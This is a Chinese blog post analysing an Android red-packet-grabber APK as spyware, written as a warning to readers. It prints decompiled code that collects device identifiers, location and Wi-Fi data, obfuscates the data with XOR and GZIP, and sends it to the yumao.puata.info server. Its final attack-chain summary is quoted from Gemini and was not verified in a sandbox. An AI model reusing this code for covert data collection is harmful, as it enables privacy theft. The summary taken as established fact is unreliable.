## 前言

大家新年快乐。

~~弱弱地说一句，好像有点标题党了，如果有问题或补充欢迎评论或私信。~~

最近同学群里发红包非常频繁，有点手痒，但自己反应慢，一直抢不到想开挂。搜到了个 GitHub 仓库 <https://github.com/qqqkoko123/qianghongbao>。

但是，这个仓库源码**已经四年没有更新了**，但 release 却发的非常频繁，最新一次 release 距离本文写下时仅 $4$ 天，支持了手机端最新版微信 v8.0.66；最新一次回复 issue 仅有 $3$ 天，

（该 release 发布[见此](https://github.com/qqqkoko123/qianghongbao/releases/tag/1.1.18)，其 `.apk` 文件的 SHA256 码为 `7ee459ffb57375d788ec9da09c6c3872f15adc06b481b9ec1d2b433583f86d13`）。

抱着怀疑的态度在一台备用手机上安装了它之后，看到它申请了大量权限，包括无障碍模式、GPS 定位、手机号获取等。

一个抢红包外挂为什么要这么多权限？带着这个疑问，我开始尝试分析这个软件。

## 初步分析

![image](https://image.langningchen.com/jviydnztusyzutzgydsanrhslbotdbbo)

$$\color{gray}\footnotesize\text{VirusTotal 分析结果}$$

[VirusTotal 分析链接](https://www.virustotal.com/gui/file/7ee459ffb57375d788ec9da09c6c3872f15adc06b481b9ec1d2b433583f86d13/detection)。

可以看到其使用了 Android MarsDaemon，经过搜索得到这是个进程保活库。为啥脚本还不让杀进程，这进一步增加了它的嫌疑。

在 Detail 中的 Interesting Strings 部分可以看到如下被硬编码的字符串：

```
http://schemas.android.com/apk/res/android
https://alogsus.umeng.com
https://alogus.umeng.com
https://aspect-upush.umeng.com/occa/v1/event/report
https://ccs.umeng.com/ra
https://developer.umeng.com/docs/66632/detail/
https://plbslog.umeng.com
https://pslog.umeng.com
https://pslog.umeng.com/
https://pslog.umeng.com/ablog
https://qr.alipay.com/fkx13578bxlmmuehmvnqy77
https://sss.umeng.com/api/v2/al
https://ucc.umeng.com/v1/fetch
https://ucc.umeng.com/v2/inn/fetch
https://ulogs.umeng.com
https://ulogs.umengcloud.com
https://utoken.umeng.com
https://yumao.puata.info/anti_logs
https://yumao.puata.info/cc_info
```

其大量与外界 URL 进行交互，行为可疑。

![image](https://image.langningchen.com/mlslrxsnnfgdlkgshclpkcenpdqwxniy)

$$\color{gray}\footnotesize\text{JADX 反编译的软件结构}$$

其包名含有 `volcano`，是易语言安卓版（E4A）的典型特征之一。

打开它的 `AndroidManifest.xml`，不看不知道，一看吓一跳，从第 $13$ 到 $38$ 行：

```
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
    <uses-permission android:name="android.permission.BLUETOOTH_SCAN"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.READ_LOGS"/>
    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.WRITE_MEDIA_STORAGE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT"/>
    <uses-permission android:name="android.permission.BLUETOOTH"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission-sdk-23 android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="com.google.android.gms.permission.AD_ID"/>
```

共申请了 $16$ 个权限。其中包含 `READ_SMS`（短信读取），`MANAGE_EXTERNAL_STORAGE` 和 `WRITE_EXTERNAL_STORAGE`（文件管理和写入），`ACCESS_FINE_LOCATION`（地理位置获取），`READ_PHONE_NUMBERS` 和 `READ_PHONE_STATE`（手机号以及状态读取），`REQUEST_INSTALL_PACKAGES`（静默应用安装），`QUERY_ALL_PACKAGES`（应用列表检测），`SYSTEM_ALERT_WINDOW`（悬浮窗）。

试问，一个抢红包脚本为什么要知道我手机号，我的 GPS 定位，我的短信内容？它的目的已经不言而喻了。

## 深入分析

（由于我个人技术水平欠佳，本部分分析中部分借用 Gemini3 的帮助）

文件中大量文件、函数、变量命名方式为拼音，而且对于多音字处理出现大量谬误，推测为易语言所写。

把目光投向其服务部分的 `com.qqq.WXhongbao.AutoService`。其通过监听通知栏和任务分发做到抢红包，并有调用语音合成模块，似乎并没有涉及投毒。

搜索硬编码的神秘字符串：

![image](https://image.langningchen.com/ypbzqgpgxifphyvpuipqqopnyvdceivm)

找到文件 `src/com/uyumao/c`：

![image](https://image.langningchen.com/wvtldydurjqvjregcssltuhwloqeewvm)

（这个 `/uyumao` 文件夹似乎是后面放入的或是混淆过，文件命名格式是 a~t 和一个 sdk 文件夹）。

文件 `c` 顶端有注释：`/* compiled from: UYMInnerManager.java */`，其原名 `UYMInnerManager.java`。

`c` 中还使用了唯一标识追踪，在本地创建 `uyumao_info` 配置文件，见此：

```
if (jSONObject2.has(au.c)) {
    context.getSharedPreferences("uyumao_info", 0).edit().putString(au.c, jSONObject2.optString(au.c)).apply();
}
```

每日发包签到,记录是否成功连接过服务器：

```
if (jSONObject2.has("resp_code") && jSONObject2.optInt("resp_code") == 0) {
    context.getSharedPreferences("uyumao_info", 0).edit().putBoolean(new SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(new Date()), true).apply();
}
```

看向 `c` 文件里从 $33$ 行到 $58$ 行的 a 函数：

```
    public static void a(Context context, JSONObject jSONObject, boolean z) {
        if (jSONObject == null) {
            Log.e("UYMInnerManager", "JSONObject in sendInitData() is null.");
            return;
        }
        String strA = k.a(context, "https://yumao.puata.info/anti_logs", jSONObject.toString());
        Log.d("UYMInnerManager", "msg: " + strA + "; json: " + jSONObject);
        if (strA == null) {
            return;
        }
        try {
            JSONObject jSONObject2 = new JSONObject(strA);
            if (jSONObject2.has(au.c)) {
                context.getSharedPreferences("uyumao_info", 0).edit().putString(au.c, jSONObject2.optString(au.c)).apply();
            }
            if (z) {
                if (jSONObject2.has("resp_code") && jSONObject2.optInt("resp_code") == 0) {
                    context.getSharedPreferences("uyumao_info", 0).edit().putBoolean(new SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(new Date()), true).apply();
                }
                e.a(new File(context.getCacheDir() + File.separator + "net_change"));
            }
        } catch (Throwable th) {
            th.printStackTrace();
        }
    }
}
```

其调用了 `k.a`，看向 `k`（其注释里写 `/* compiled from: NetUtil.java */`）中的类：

```
public class k {

    /* compiled from: NetUtil.java */
    public static class a implements HostnameVerifier {
        @Override // javax.net.ssl.HostnameVerifier
        public boolean verify(String str, SSLSession sSLSession) {
            if (TextUtils.isEmpty(str)) {
                return false;
            }
            return "yumao.puata.info".equalsIgnoreCase(str) || "preulogs.umeng.com".equalsIgnoreCase(str);
        }
    }

    public static synchronized String a(Context context, String str, String str2) {
        byte[] byteArray;
        try {
            HttpsURLConnection httpsURLConnection = (HttpsURLConnection) new URL(str).openConnection();
            httpsURLConnection.setHostnameVerifier(new a());
            SSLContext sSLContext = SSLContext.getInstance("TLS");
            sSLContext.init(null, null, new SecureRandom());
            httpsURLConnection.setSSLSocketFactory(sSLContext.getSocketFactory());
            httpsURLConnection.setRequestProperty("appkey", UMUtils.getAppkey(context));
            httpsURLConnection.setRequestProperty("Content-Type", "application/octet-stream");
            httpsURLConnection.setConnectTimeout(30000);
            httpsURLConnection.setReadTimeout(30000);
            httpsURLConnection.setRequestMethod("POST");
            httpsURLConnection.setDoOutput(true);
            httpsURLConnection.setDoInput(true);
            OutputStream outputStream = httpsURLConnection.getOutputStream();
            byte[] bytes = str2.getBytes();
            try {
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                GZIPOutputStream gZIPOutputStream = new GZIPOutputStream(byteArrayOutputStream);
                gZIPOutputStream.write(bytes);
                gZIPOutputStream.close();
                byteArray = byteArrayOutputStream.toByteArray();
                byteArrayOutputStream.flush();
                byteArrayOutputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
                byteArray = null;
            }
            outputStream.write(a(byteArray, UMUtils.getAppkey(context).getBytes()));
            outputStream.flush();
            outputStream.close();
            if (httpsURLConnection.getResponseCode() == 200) {
                InputStream inputStream = httpsURLConnection.getInputStream();
                byte[] bArr = new byte[1024];
                ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
                while (true) {
                    int i = inputStream.read(bArr);
                    if (i == -1) {
                        break;
                    }
                    byteArrayOutputStream2.write(bArr, 0, i);
                }
                return "none".equals(httpsURLConnection.getContentEncoding()) ? new String(byteArrayOutputStream2.toByteArray()) : new String(a(byteArrayOutputStream2.toByteArray(), UMUtils.getAppkey(context).getBytes()));
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        return null;
    }

    public static byte[] a(byte[] bArr, byte[] bArr2) {
        if (bArr != null && bArr.length != 0 && bArr2 != null && bArr2.length != 0) {
            for (int i = 0; i < bArr.length; i++) {
                bArr[i] = (byte) ((bArr[i] ^ bArr2[i % bArr2.length]) ^ (i & 255));
            }
        }
        return bArr;
    }
}
```

它先把数据压缩后再用友盟的 AppKey 进行异或加密，因此哪怕有人抓包看到的也是看起来正常的二进制数据。

同时还用了证书校验劫持，把恶意域名和友盟的域名一同返回 `true`，能够绕过 HTTPS 的证书验证检测，和服务器建立安全连接。

```
public boolean verify(String str, SSLSession sSLSession) {
    if (TextUtils.isEmpty(str)) {
        return false;
    }
    return "yumao.puata.info".equalsIgnoreCase(str) || "preulogs.umeng.com".equalsIgnoreCase(str);
}
```

`e` 则应该是过干脏活累活的文件，原名 `DevInfoUtil.java`。

其中各个函数都有不同的作用（由于其中函数数量不少，不贴出代码，有兴趣可以自己查看）：

`b()` 函数：调用友盟内部方法 `isInForeground`（即检测用户是否在前台）；

`c(Context context)`：（判断当前网络是 Wifi 还是移动网络）；

`d(Context context)`：获取当前 SIM 卡所属的运营商名称；

`e(Context context)`：精确抓取你当前连接的 Wi-Fi 热点信息，包括 Wifi 的 BSSID（物理地址）；

`f(Context context)`：扫描并记录设备周围搜索到的所有 Wi-Fi 热点信息（最多采集 100 个）。

`g(Context context)`：类似 `e(Context context)`，提取当前连接的 Wi-Fi 名称（SSID）和物理地址（BSSID）。

`h(Context context)`：环境预检，检测 Wifi 是否开启。

`a(byte[] bArr, byte[] bArr2)`：将数据加密混淆；

`a(JSONObject, String, String, boolean)`：负责网络回传，把采集好的隐私数据通过 HTTP 协议发往远程服务器；

`b(File file)`：读取文件并且转成一个字符串；

`a(byte[] bArr, OutputStream outputStream)`：将一段经过 GZIP 压缩的二进制数据还原为原始数据；

`a(File file, byte[] bArr, boolean z)`：将字节数组写入文件；

`b(Context context)`：直接调用 GPS 硬件，获取用户精确坐标。

下面的三个 `a` 函数：将之前所有方法搜集到的隐私数据（GPS、Wi-Fi、运营商等）进行最后的打包、加密并上传到他的服务器，实现了一套私有的、具有反侦察能力的通信协议，从客户端到服务端与服务器返回的数据都是被加密的二进制数据流，header 使用了自定义的特殊加密方式 `xgzip`，加密与解密函数见上文 `a` 函数；

`a(File file)`：递归地删除文件夹，销毁证据；

`a(NetworkInfo networkInfo)`：识别网络带宽水平；

`a(Closeable closeable)`：安全地关闭各种输入输出流；

`a(Context context, String str)`：动态权限检查，判断当前的 App 是否已经被用户授予了某项特定的权限；

`a(JSONObject jSONObject, JSONObject jSONObject2)`：将两个 JSON 对象合并，并强制转换成一个 JSONArray 格式。

从上面这些函数分析，这个部分是个间谍软件组件，负责定位用户位置、Wifi 信息等敏感信息并封装与混淆后秘密传往服务器，最后再销毁证据。

然后我们再看看 `i`（原名 `BatteryInfo.java`）：

```
public class i {
    public int a;
    public int b;
    public int c;
    public int d;
    public int e;
    public long f;

    public String toString() {
        return "BatteryInfo{level=" + this.a + ", voltage=" + this.b + ", temperature=" + this.c + ", status=" + this.d + ", chargingType=" + this.e + ", ts=" + this.f + '}';
    }
}
```

作用就是把得到的信息整合起来返回电池信息。

根据 AI 推测，其作用应该是检测是否在虚拟机或沙箱环境中（虚拟机中电池电量、电压、温度等数据往往固定不变），或是选择合适的上传时间（如充电且电量较足时）。

再瞧瞧 `d`（`CcgAgent.java`）：

其中，这个函数硬编码了数据回传地址：

```
public void run() {
    k.a(d.g, "https://yumao.puata.info/cc_info", this.a);
}
```

会把得到的信息传到这个 URL。

而 `a(context Context)` 更恐怖：

```
public static JSONObject a(Context context) {
        JSONObject jSONObject = h;
        if (jSONObject != null && jSONObject.length() > 0) {
            return h;
        }
        try {
            JSONObject jSONObject2 = new JSONObject();
            jSONObject2.put(bi.x, "Android");
            jSONObject2.put("dm", Build.MODEL);
            jSONObject2.put("av", DeviceConfig.getAppVersionName(context));
            jSONObject2.put(bi.g, UMUtils.getUMId(context));
            jSONObject2.put("ov", Build.VERSION.RELEASE);
            jSONObject2.put("chn", UMUtils.getChannel(context));
            if (UMUtils.getActiveUser(context) != null && UMUtils.getActiveUser(context).length == 2) {
                jSONObject2.put(com.umeng.analytics.pro.d.N, UMUtils.getActiveUser(context)[1]);
            } else {
                jSONObject2.put(com.umeng.analytics.pro.d.N, "");
            }
            jSONObject2.put(bi.al, UMUtils.getZid(context));
            jSONObject2.put("sv", UYMManager.getSdkVersion());
            jSONObject2.put("ak", UMUtils.getAppkey(context));
            jSONObject2.put("idfa", DeviceConfig.getIdfa(context));
            jSONObject2.put("db", Build.BRAND);
            jSONObject2.put("aid", DeviceConfig.getAndroidId(context));
            jSONObject2.put("oaid", DeviceConfig.getOaid(context));
            jSONObject2.put("imei", DeviceConfig.getImeiNew(context));
            jSONObject2.put("boa", Build.BOARD);
            jSONObject2.put("mant", Build.TIME);
            String[] localeInfo = DeviceConfig.getLocaleInfo(context);
            jSONObject2.put("ct", localeInfo[0]);
            jSONObject2.put("lang", localeInfo[1]);
            jSONObject2.put("tz", DeviceConfig.getTimeZone(context));
            jSONObject2.put("pkg", DeviceConfig.getPackageName(context));
            jSONObject2.put("disn", DeviceConfig.getAppName(context));
            String[] networkAccessMode = DeviceConfig.getNetworkAccessMode(context);
            if (!"Wi-Fi".equals(networkAccessMode[0])) {
                if ("2G/3G".equals(networkAccessMode[0])) {
                    jSONObject2.put("ac", "2G/3G");
                } else {
                    jSONObject2.put("ac", EnvironmentCompat.MEDIA_UNKNOWN);
                }
            } else {
                jSONObject2.put("ac", rg_AnZhuoHuanJing.rg_WIFIFuWu);
            }
            if (!"".equals(networkAccessMode[1])) {
                jSONObject2.put("ast", networkAccessMode[1]);
            }
            jSONObject2.put("nt", DeviceConfig.getNetworkType(context));
            String deviceToken = UMUtils.getDeviceToken(context);
            if (!TextUtils.isEmpty(deviceToken)) {
                jSONObject2.put("device_token", deviceToken);
            }
            h = jSONObject2;
        } catch (Throwable unused) {
        }
        return h;
    }
```

它干了什么呢？它不满足于只偷掉 GPS 和 Wifi，将手机型号、品牌、主板型号、系统版本、IMEI、IDFA、App 渠道号、语言、时区、网络等信息一同打包了。

再看看这个 `class a implements LocationListener`：

```
public static class a implements LocationListener {
        @Override // android.location.LocationListener
        public void onLocationChanged(Location location) {
            boolean unused = d.l = true;
            try {
                double latitude = location.getLatitude();
                double longitude = location.getLongitude();
                long time = location.getTime();
                double altitude = location.hasAltitude() ? location.getAltitude() : 0.0d;
                double speed = location.hasSpeed() ? location.getSpeed() : 0.0d;
                JSONObject jSONObject = new JSONObject();
                d.j = jSONObject;
                jSONObject.put(com.umeng.analytics.pro.d.C, latitude);
                d.j.put(com.umeng.analytics.pro.d.D, longitude);
                d.j.put("alt", altitude);
                d.j.put("acc", speed);
                d.j.put("lts", time);
                g.a(d.g, com.umeng.ccg.c.m, e.a, d.k);
            } catch (Throwable unused2) {
            }
        }

        @Override // android.location.LocationListener
        public void onProviderDisabled(String str) {
        }

        @Override // android.location.LocationListener
        public void onProviderEnabled(String str) {
        }

        @Override // android.location.LocationListener
        public void onStatusChanged(String str, int i, Bundle bundle) {
        }
    }
```

作用就是实时监听你的位置，一旦发生变动（`onLocationChanged`），就重新上传一份。

然后就是一个非常大型的 `switch` 部分，`a(Object obj, int i2)`（太长了不贴代码了）。

它根据不同的指令 `i2` 确认不同的要干的任务：

* $202$：停止定位监听，移除监听器并清理缓存。
* $101$：抓取当前 Wifi 详情和周围 Wifi。
* $102$：获取当前手机连接的运营商基站信息。
* $103$：尝试使用 GPS 进行一次精确定位。
* $104$：接收并处理名为 `CL_APL` 的消息（调用了 `r`，分析见下文）。
* $203$：将基站、GPS、设备信息合并为 `lbs` 字段，准备最终上传。

再看看 `r`（`UMAppScanTaskV2.java`） 里面干了什么：

（这部分有点长，不贴源码了）

首先它硬编码了一个数组，并用 `a` 里面的方式进行了解密：

![image](https://image.langningchen.com/licdgkyvehhaibtaktoqizrhtakuejfr)

这份字典估计是为了防止杀毒软件报警，用反射执行绕过。

解密出来的数据是：

```
{"c":"android.content.Context","p":"getPackageManager","i":"android.content.Intent","a":"android.intent.action.MAIN","m":"android.content.pm.PackageManager","q":"queryIntentActivities","r":"android.content.pm.ResolveInfo","s":"activityInfo","n":"packageName","t":"android.content.pm.ActivityInfo","u":"getInstalledPackages","v":"android.content.pm.PackageInfo"}
```

作用：
* `u`：返回安装的应用列表；
* `v`：返回应用信息；
* `i`、`a` 和 `q`：筛选 App；
* `n`：记录要偷走的核心数据；

然后主体部分有分类讨论：

`if (1 == this.b)` 就扫描已安装的所有应用包名、版本、签名等信息；

否则就扫描正在运行或最近使用过的应用信息，再使用 TreeSet 对结果去重，确保收集到的名单唯一。

再看看 `t`（`UMReflectUtils.java`）：

从文件名就大概知道这是反射工具类。

例如 `Object a(String str, String str2, Class<?>[] clsArr, Object obj, Object[] objArr)` 里面：

```
if (!declaredMethod.isAccessible()) {
    declaredMethod.setAccessible(true);
}
```

强行抑制了安全检测。

再就是这个：

```
return Class.forName(str, true, contextClassLoader);
```

这是动态身份伪装，只有运行的一瞬间才会把字符串翻译成真正的类名。

`a(Field field, Object obj)` 则用于直接窃取成员变量。

## 后记

限于篇幅原因，此处不一一介绍其余部分程序，直接放个 Gemini 的结论（我本地暂时没有条件把它扔进沙箱测试，致歉，如果有大手子可以做到欢迎贡献本文）。

1.  **诱饵阶段**：你运行抢红包 App，开启了“无障碍权限”。
2.  **潜伏阶段**：`marsdaemon` 启动双进程保活，`UYMManager` 初始化。
3.  **环境刺探**：`n.java` 拿硬件指纹，`j.java` 拿电池状态，`d.java` 拿地理位置，`q/r.java` 全盘扫描你装了哪些银行/金融 App。
4.  **远程领命**：`g.java` 开启 TCP 长连接，等待 `puata.info` 的指令。
5.  **按需攻击**：如果服务器发现你装了“某大额银行 App”，它会下发代号（ActionName）。
6.  **执行与加工**：`f.java` 分发任务，那个被 JADX 跳过的 **`c.a`（Method dump skipped）** 开始发威。它利用 **`t.java`（反射工具）** 动态调用系统函数，读取你的短信（`READ_SMS`）或拦截你的通知。
7.  **加密外传**：数据交给 **`e.java`（异或加密+GZIP压缩）**，最后由 **`k.java`（Https POST）** 发往黑客老巢。
8.  **毁灭痕迹**：上报成功后，`e.a(File)` 递归删除本地缓存的 `net_change` 文件，仿佛一切都没发生过。

最后就是，这个程序的抢红包只是个空壳，真正的主题在于这个 `uyumao` 的 SDK，推测友盟仅为其掩护。最后会将其文件加密传至 `puata.info`。

经过某学长测试，其服务器仅开启 `80` 和 `443` 端口（对应 Web 服务），解析出的 IP 是阿里云的服务器。

最后：**不要安装！不要安装！**如果要测试请在虚拟环境测试，否则你的个人信息可能全部被它传走了。

写于 $2026$ 年元旦，祝大家新年快乐！